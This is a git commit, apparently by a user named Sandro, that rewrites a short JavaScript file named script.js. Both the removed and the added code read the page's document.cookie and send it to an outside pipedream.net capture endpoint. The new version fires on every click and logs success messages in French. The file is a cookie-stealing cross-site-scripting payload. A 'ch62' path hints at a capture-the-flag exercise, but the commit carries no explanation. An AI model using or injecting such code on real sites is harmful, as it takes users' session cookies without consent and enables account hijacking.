3614784ef049bcf7715fbad99b5c6d163ebf2277
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-23 23:07:36 +0200

    Update script.js test

--- script.js
+++ script.js
@@ -1,3 +1,12 @@
-var cookies = document.cookie;
-alert(cookies);
-fetch('https://enh87g4rhccr5.x.pipedream.net/web-client/ch62/capture-cookies?cookie=' + encodeURIComponent(cookies));
+document.addEventListener('click', function() {
+    var cookies = document.cookie;
+    fetch('https://enh87g4rhccr5.x.pipedream.net/capture-cookies?cookie=' + encodeURIComponent(cookies))
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.text();
+        })
+        .then(data => console.log('Cookies envoyés avec succès :', data))
+        .catch(error => console.error('Erreur lors de l\'envoi des cookies :', error));
+});
